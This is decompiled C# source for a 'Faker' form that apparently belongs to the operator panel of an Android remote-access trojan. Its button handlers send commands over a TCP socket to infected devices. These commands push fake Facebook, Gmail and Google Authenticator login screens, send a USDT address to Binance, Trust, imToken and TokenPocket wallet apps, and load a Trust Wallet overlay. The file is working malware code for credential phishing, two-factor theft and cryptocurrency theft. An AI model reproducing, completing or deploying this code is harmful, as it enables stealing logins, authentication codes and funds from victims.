using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

// Token: 0x02000074 RID: 116
[DesignerGenerated]
public partial class Faker : Form
{
	// Token: 0x0600055B RID: 1371 RVA: 0x00002D6A File Offset: 0x00000F6A
	public Faker()
	{
		this.Title = "null";
		this.InitializeComponent();
	}

	// Token: 0x0600055E RID: 1374 RVA: 0x00085478 File Offset: 0x00083678
	private void SendDataToPlatform(string dataPrefix, string keys)
	{
		string[] array = keys.Split(new char[]
		{
			':'
		});
		object[] parametersObjects = new object[]
		{
			this.Client,
			string.Concat(new string[]
			{
				SecurityKey.KeysClient2,
				Data.SPL_SOCKET,
				dataPrefix,
				Data.SPL_SOCKET,
				array[0],
				Data.SPL_SOCKET,
				array[1],
				Data.SPL_SOCKET,
				SecurityKey.Lockscreen,
				Data.SPL_SOCKET,
				Conversions.ToString(0),
				Data.SPL_SOCKET,
				Conversions.ToString(0),
				Data.SPL_SOCKET,
				Data.SPL_ARRAY,
				Data.SPL_SOCKET,
				this.classClient.ClientRemoteAddress
			}),
			Codes.Encoding().GetBytes("null"),
			this.classClient
		};
		this.classClient.SendMessage(parametersObjects);
	}

	// Token: 0x0600055F RID: 1375 RVA: 0x00085570 File Offset: 0x00083770
	private void MetroSetButton1_Click(object sender, EventArgs e)
	{
		if (this.platfromtext.Text.Length < 2)
		{
			Interaction.MsgBox("Select Platform First!!!", MsgBoxStyle.OkOnly, null);
		}
		else if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				string text = (!this.Checkalert.Checked) ? "0:" : "1:";
				if (Operators.CompareString(this.platfromtext.Text, "Facebook", false) == 0)
				{
					text += "fb:fsh";
				}
				else if (Operators.CompareString(this.platfromtext.Text, "Gmail", false) == 0)
				{
					text += "go:fsh";
				}
				else if (Operators.CompareString(this.platfromtext.Text, "google authenticator", false) == 0)
				{
					object[] parametersObjects = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"goauth<*>X",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
					return;
				}
				object[] parametersObjects2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"msg:",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000560 RID: 1376 RVA: 0x00085844 File Offset: 0x00083A44
	private void Button20_Click(object sender, EventArgs e)
	{
		if (this.usdtadress.Text.Length < 1)
		{
			Interaction.MsgBox("Please enter the address of the block first!", MsgBoxStyle.OkOnly, null);
		}
		else if (this.ComboPrims.Text.Length < 2)
		{
			Interaction.MsgBox("Please select app first!", MsgBoxStyle.OkOnly, null);
		}
		else
		{
			object[] parametersObjects = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"usdtress<*>",
					this.usdtadress.Text,
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
			string text = this.ComboPrims.Text.ToLower();
			string a = text;
			if (!(a == "binance"))
			{
				if (!(a == "trust"))
				{
					if (!(a == "imtoken") && !(a == "tokenpocket"))
					{
						Interaction.MsgBox("error!", MsgBoxStyle.OkOnly, null);
					}
				}
				else
				{
					this.SendDataToPlatform("sp<*>LKSDU", this.classClient.Keys);
				}
			}
			else
			{
				this.SendDataToPlatform("sp<*>LKSBU", this.classClient.Keys);
			}
		}
	}

	// Token: 0x06000561 RID: 1377 RVA: 0x00085A18 File Offset: 0x00083C18
	private void Button1_Click(object sender, EventArgs e)
	{
		if (this.ComboPrims.Text.Length < 2)
		{
			Interaction.MsgBox("Please select app first!", MsgBoxStyle.OkOnly, null);
		}
		else
		{
			string text = this.ComboPrims.Text.ToLower();
			string a = text;
			if (!(a == "binance"))
			{
				if (!(a == "trust"))
				{
					if (!(a == "imtoken") && !(a == "tokenpocket"))
					{
						Interaction.MsgBox("error!", MsgBoxStyle.OkOnly, null);
					}
				}
				else
				{
					this.SendDataToPlatform("sp<*>LKKDU", this.classClient.Keys);
				}
			}
			else
			{
				this.SendDataToPlatform("sp<*>LKKBU", this.classClient.Keys);
			}
		}
	}

	// Token: 0x06000562 RID: 1378 RVA: 0x00085AD0 File Offset: 0x00083CD0
	private void sButton1_Click(object sender, EventArgs e)
	{
		string text = "test";
		string text2 = "youtube.com";
		string text3 = "blank";
		if (!string.IsNullOrEmpty("com.wallet.crypto.trustapp"))
		{
			text3 = "com.wallet.crypto.trustapp";
		}
		string text4 = string.Concat(new string[]
		{
			text,
			">",
			text2,
			">",
			text3,
			">"
		});
		if (this.Classclient == null)
		{
			try
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lodp<*>ad<*>",
						text4,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0400075F RID: 1887
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MetroSetButton1")]
	private DrakeUIButtonIcon _MetroSetButton1;

	// Token: 0x04000760 RID: 1888
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	// Token: 0x04000761 RID: 1889
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button20")]
	private Button _Button20;

	// Token: 0x04000762 RID: 1890
	public TcpClient Client;

	// Token: 0x04000763 RID: 1891
	public Client classClient;

	// Token: 0x04000764 RID: 1892
	public string DownloadsFolder;

	// Token: 0x04000765 RID: 1893
	public string Title;

	// Token: 0x04000766 RID: 1894
	public Client Classclient;

	// Token: 0x0400076B RID: 1899
	[AccessedThroughProperty("platfromtext")]
	internal DrakeUIComboBox platfromtext;

	// Token: 0x0400076C RID: 1900
	[AccessedThroughProperty("Checkalert")]
	internal DrakeUICheckBox Checkalert;

	// Token: 0x0400076D RID: 1901
	internal DrakeUIButtonIcon MetroSetButton1;
}
